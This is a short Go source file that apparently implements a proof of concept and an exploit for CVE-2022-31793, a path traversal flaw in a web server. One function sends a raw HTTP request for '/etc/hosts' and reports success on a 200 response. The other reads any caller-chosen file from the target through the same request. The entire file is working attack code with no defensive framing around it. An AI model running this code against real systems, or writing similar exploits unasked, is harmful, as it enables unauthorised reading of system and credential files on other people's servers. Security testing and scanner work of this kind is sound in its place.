package cve_2022_31793

import (
	"log"
	"net"
	"strings"
	"time"
)

func PocTest(ip string) {
	var buf [4096]byte
	addr := ip + ":80"
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		log.Fatalf("get conn failed,err:%v", err)
	}

	msg := "GET a/etc/hosts / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: " + ip + "\r\nAccept: */*\r\n\r\n"
	log.Println(msg)
	conn.Write([]byte(msg))

	time.Sleep(time.Millisecond * 500)

	n, err := conn.Read(buf[:])
	if nil != err {
		log.Fatal("func: PocTest, method: conn.Read, errInfo:", err)
	}
	result := string(buf[0:n])
	log.Println(result)

	if strings.Contains(result, "200 OK") {
		log.Println("poc verify successful")
	}
}

func ExpTest(ip string, ss map[string]string) {
	var buf [4096]byte
	addr := ip + ":80"
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		log.Fatalf("get conn failed,err:%v", err)
	}

	if ss["AttackType"] == "file" {
		file := ss["file"]
		log.Printf("filename:%v", file)
		msg := "GET a" + file + " / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: " + ip + "\r\nAccept: */*\r\n\r\n"
		log.Printf("tcp body:\n%v", msg)
		conn.Write([]byte(msg))

		time.Sleep(time.Millisecond * 500)

		n, err := conn.Read(buf[:])
		if nil != err {
			log.Fatal("func: PocTest, method: conn.Read, errInfo:", err)
		}
		result := string(buf[0:n])
		log.Println(result)
	}
}
